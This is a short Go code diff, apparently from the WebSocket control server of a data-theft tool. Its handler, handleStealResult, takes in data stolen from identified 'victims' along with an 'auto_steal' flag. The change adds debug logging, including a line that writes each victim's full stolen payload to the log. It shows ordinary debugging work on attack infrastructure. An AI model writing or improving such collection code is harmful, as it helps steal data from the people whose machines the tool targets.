@@ -294,13 +294,21 @@ func (h *Hub) handleStealResult(ws *websocket.Conn, payload map[string]any) {
 		}
 	}
 	h.mu.RUnlock()
+
+	log.Printf("[ws:steal_result] victimID=%s payload=%v", victimID, payload)
+
 	if victimID == "" {
+		log.Printf("[ws:steal_result] victimID is empty")
 		return
 	}
 
 	dataStr := strFrom(payload["data"])
 	autoSteal := strFrom(payload["auto_steal"])
+
+	log.Printf("[ws:steal_result] victimID=%s dataStr_len=%d autoSteal=%s", victimID, len(dataStr), autoSteal)
+
 	if dataStr == "" {
+		log.Printf("[ws:steal_result] dataStr is empty")
 		return
 	}
 
